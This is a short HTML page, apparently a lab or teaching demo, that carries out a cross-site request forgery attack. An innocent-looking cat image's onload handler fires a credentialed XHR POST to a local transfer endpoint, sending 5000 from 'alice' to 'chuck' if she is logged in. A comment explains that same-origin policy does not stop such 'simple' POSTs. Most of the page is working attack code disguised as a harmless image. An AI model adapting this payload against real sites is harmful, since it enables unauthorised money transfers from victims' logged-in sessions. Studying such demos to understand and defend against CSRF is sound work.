<html>

  <body>
    <h1> attack html and javascript</h1>

    <p>
      Innocent kitty attack runs js function with onload event of img.
      <br>
      <br>
      Script sends money from alice to chuck if alice is logged in.
      <br>
      <br>
      NOTE: Script's XHR request is cross origin. The response is blocked by
      browser but is still processes on the server side because SOP allows 
      and "simple" POST requests.
    </p>
    <img 
      onload="doPlainPost()"
      src="https://d2ph5fj80uercy.cloudfront.net/06/cat1996.jpg"
      style="width: 80px; height: 80px"
    />
   </body>

  <script>
    console.log('script section');

    function plainPostOnLoad() {
      console.log('onLoad for plain POST request success: ' + this.responseText);
    }

    function doPlainPost() {
      var oReq = new XMLHttpRequest();
      oReq.withCredentials = true;
      oReq.addEventListener("load", plainPostOnLoad);
      oReq.open('POST', 'http://localhost:5002/transfer?from=alice&to=chuck&amt=5000');
      oReq.send();
    }
  </script>


</html>
